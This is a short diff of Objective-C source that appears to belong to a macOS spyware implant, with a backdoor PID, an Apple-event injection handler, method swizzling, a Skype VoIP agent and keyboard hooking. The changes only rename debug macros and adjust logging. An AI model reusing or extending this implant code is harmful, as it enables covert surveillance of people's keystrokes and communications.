@@ -27,7 +27,6 @@
 #import "RCSMInputManager.h"
 #import "RCSMAgentVoipSkype.h"
 
-#import "RCSMCommunicationManager.h"
 
 //#define DEBUG_TMP
 //#define DEBUG
@@ -88,7 +87,7 @@ OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
   
   gBackdoorPID = value;
   
-#ifdef DEBUG_TMP
+#ifdef DEBUG_INPUT_MANAGER
   NSLog(@"%s: running RCSeload event handler", __FUNCTION__);
 #endif
     
@@ -300,8 +299,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       */
       if (gOSMajor == 10 && gOSMinor == 6)
         {
-#ifdef DEBUG_TMP
-          debugLog(ME, @"running osax bundle");
+#ifdef DEBUG_INPUT_MANAGER
+          warnLog(@"running osax bundle");
 #endif
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
@@ -327,8 +326,8 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       
       if (gOSMajor == 10 && gOSMinor == 6)
         {
-#ifdef DEBUG_TMP
-          debugLog(ME, @"running osax bundle");
+#ifdef DEBUG_INPUT_MANAGER
+          warnLog(@"running osax bundle");
 #endif
           [NSThread detachNewThreadSelector: @selector(startCoreCommunicator)
                                    toTarget: self
@@ -810,7 +809,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           
           if (mouseFlag == 0 || mouseAgentIsActive == 0)
             {
-#ifdef DEBUG_TMP
+#ifdef DEBUG_INPUT_MANAGER
               NSLog(@"Hooking keyboard");
 #endif
               
